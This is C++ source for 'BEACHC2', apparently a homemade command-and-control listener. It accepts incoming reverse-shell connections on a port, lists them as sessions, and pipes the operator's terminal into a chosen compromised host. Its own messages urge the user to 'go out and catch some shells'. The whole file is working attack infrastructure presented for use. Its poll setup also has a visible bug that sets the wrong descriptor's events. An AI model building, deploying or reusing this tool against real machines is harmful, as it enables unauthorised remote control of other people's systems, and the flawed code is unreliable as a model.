#include <iostream>
#include <stdlib.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <poll.h>
#include <string>
#include <sstream>
#include <vector>
#include <map>
#include <thread>

#define BUFFERSIZE 1024
#define POLL_STDIN 0
#define POLL_NETOUT 1
#define POLL_NETIN 2
#define POLL_STDOUT 3

bool shellGoing;

struct IOFDS {
    int stdin_fd;
    int stdout_fd;
    int stderr_fd;
};

void signal_handler(int code)
{
    if(code == 2)
    {
        shellGoing = false;
    }
    else
    {
        exit(code);
    }
}

void help()
{
    std::string message = "\n\
    BEACHC2\n\
    \n\
    Commands:\n\
        sessions: lists available sessions\n\
        use: opens to the session listed [usage: use <session number>]\n\
        exit: safely closes the server\n\
        help: shows this menu\n\
    ";
    
    std::cout << message << std::endl;
}

void split(std::vector<std::string> *args, std::string str)
{
    std::stringstream ss(str);
    
    while(getline(ss, str, ' '))
    {
        args->push_back(str);
    }
}

void plusMsg(std::string msg)
{
    std::cout << std::endl << "[+] " << msg << std::endl;
}

void errorMsg(std::string msg)
{
    std::cout << std::endl << "[-] " << msg << std::endl;
}

void infoMsg(std::string msg)
{
    std::cout << std::endl << "[*] " << msg << std::endl;
}

void debug(std::string msg)
{
    std::cout << "DEBUG: " << msg << std::endl;
}

void prompt()
{
    std::cout << "BEACHC2>";
}

void StartServer(std::map<int, std::string> *sessions, int *serverfd, int port, bool *running)
{
    *serverfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr, clientAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr("0.0.0.0");
    
    int enable = 1;
    setsockopt(*serverfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    bind(*serverfd, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(*serverfd, 5);
    infoMsg("Server started on 0.0.0.0:" + std::to_string(port));
    prompt();
    
    socklen_t clientAddrSize = sizeof(clientAddr);
    
    while(*running)
    {
        int clientfd = accept(*serverfd, (sockaddr*)&clientAddr, &clientAddrSize);
        char *ip = inet_ntoa(clientAddr.sin_addr);
        infoMsg("Connection from " + (std::string)ip);
        prompt();
        
        sessions->insert(std::pair<int, std::string>(clientfd, (std::string)ip));
    }
}

ssize_t fillBuff(int sockfd, char *buffer, size_t *pos)
{
    size_t bufferSize = BUFFERSIZE - *pos;
    ssize_t bytes_read = read(sockfd, buffer + *pos, bufferSize);

    if(bytes_read <= 0)
    {
        return bytes_read;
    }
    
    *pos += bytes_read;
    return bytes_read;
}

ssize_t drainBuff(int sockfd, char *buffer, size_t *pos)
{
    ssize_t bytes_sent = write(sockfd, buffer, *pos);
    
    if(bytes_sent <= 0)
    {
        return bytes_sent;
    }
    
    *pos -= bytes_sent;
    memmove(buffer, buffer + bytes_sent, *pos);

    return bytes_sent;
}

void shellClose(bool *going)
{
    *going = false;
}

int shell(int clientfd, IOFDS io)
{
    shellGoing = true;
    signal(SIGINT, signal_handler);
    
    char stdInBuff[BUFFERSIZE];
    size_t stdInPos = 0;
    
    char stdOutBuff[BUFFERSIZE];
    size_t stdOutPos = 0;
    
    struct pollfd fds[4];
    
    fds[POLL_STDIN].fd = io.stdin_fd;
    fds[POLL_STDIN].events = POLLIN;
    
    fds[POLL_NETOUT].fd = clientfd;
    fds[POLL_NETOUT].events = 0;
    
    fds[POLL_NETIN].fd = clientfd;
    fds[POLL_NETOUT].events = POLLIN;
    
    fds[POLL_STDOUT].fd = io.stdout_fd;
    fds[POLL_STDOUT].events = 0;
    
    
    int returnCode = 0;
    ssize_t code = 0;
    while(shellGoing)
    {
        poll(fds, 4, 10);
        
        if(fds[POLL_STDIN].revents & POLLIN && stdInPos < BUFFERSIZE)
        {
            code = fillBuff(fds[POLL_STDIN].fd, stdInBuff, &stdInPos);
            
            if(code == -1)
            {
                errorMsg("Connection to client lost");
                returnCode = 1;
                break;
            }
            
            if(stdInPos == BUFFERSIZE)
            {
                fds[POLL_STDIN].events = 0;
            }
            if(stdInPos > 0)
            {
                fds[POLL_NETOUT].events = POLLOUT;
            }
        }
        
        if(fds[POLL_NETOUT].revents & POLLOUT && stdInPos > 0)
        {
            code = drainBuff(fds[POLL_NETOUT].fd, stdInBuff, &stdInPos);
            
            if(code == -1)
            {
                errorMsg("Connection to client lost");
                break;
            }
            
            if(stdInPos == 0)
            {
                fds[POLL_NETOUT].events = 0;
            }
            if(stdInPos < BUFFERSIZE)
            {
                fds[POLL_STDIN].events = POLLIN;
            }
        }
        
        if(fds[POLL_NETIN].revents & POLLIN && stdOutPos < BUFFERSIZE)
        {
            code = fillBuff(fds[POLL_NETIN].fd, stdOutBuff, &stdOutPos);
            
            if(code == -1)
            {
                errorMsg("Connection to client lost");
                break;
            }
            
            if(stdOutPos == BUFFERSIZE)
            {
                fds[POLL_NETIN].events = 0;
            }
            if(stdOutPos > 0)
            {
                fds[POLL_STDOUT].events = POLLOUT;
            }
        }
        
        if(fds[POLL_STDOUT].revents & POLLOUT && stdOutPos > 0)
        {
            code = drainBuff(fds[POLL_STDOUT].fd, stdOutBuff, &stdOutPos);
            
            if(code == -1)
            {
                errorMsg("Connection to client lost");
                break;
            }
            
            if(stdOutPos == 0)
            {
                fds[POLL_STDOUT].events = 0;
            }
            if(stdOutPos < BUFFERSIZE)
            {
                fds[POLL_NETIN].events = POLLIN;
            }
        }
    }
    return returnCode;
}

int main(int argc, char* argv[])
{
    std::map<int, std::string> sessions;
    int serverfd = -1;
    int port = -1;
    std::string inputStr = "";
    
    bool running = true;
    
    struct IOFDS io;
    io.stdin_fd = STDIN_FILENO;
    io.stdout_fd = STDOUT_FILENO;
    io.stderr_fd = STDERR_FILENO;
    
    if(argc < 2)
    {
        help();
        std::cout << std::endl << "Usage: ./BEACHC2 <PORT>" << std::endl;
        return 0;
    }
    
    try
    {
        port = std::stoi(argv[1]);
        if(port < 1 || port > 65535)
        {
            throw std::invalid_argument("Invalid port number");
        }
    } catch (...)
    {
        help();
        std::cout << std::endl;
        errorMsg("Please enter a valid port <0-65535>");
        return 0;
    }
    
    std::thread serverThread(StartServer, &sessions, &serverfd, port, &running);
    
    int count = -1;
    std::vector<std::string> args;
    std::map<int, int> choices;
    while(true)
    {
        choices.clear();
        args.clear();
        prompt();
        std::getline(std::cin, inputStr);
        if(inputStr.length() == 0) { continue; }
        split(&args, inputStr);
        
        if(inputStr == "exit")
        {
            infoMsg("Closing server...");
            running = false;
            serverThread.detach();
            break;
        }
        if(inputStr == "help")
        {
            help();
            continue;
        }
        if(inputStr == "sessions")
        {
            if(sessions.size() == 0)
            {
                infoMsg("No sesssions available, go out and catch some shells!");
            }
                
            count = 0;
            for(auto &i : sessions)
            {
                std::cout << count << ") " << i.second << std::endl;
                count++;
            }
        }
        if(args[0] == "use")
        {
            try
            {
                count = 0;
                for(auto &i : sessions)
                {
                    choices.insert(std::pair<int, int>(count, i.first));
                    count++;
                }
                
                int shellReturnCode = shell(choices[std::stoi(args[1])], io);
                
                if(shellReturnCode == 1)
                {
                    infoMsg("Client remove functionality will be added in a future version!");
                }
            } catch (...)
            {
                errorMsg("Invalid session number");
            }
        }
    }
    
    for(auto &i : sessions)
    {
        close(i.first);
    }
    close(serverfd);
    std::cout << "Thank you for using BEACHC2!" << std::endl;
    return 0;
}
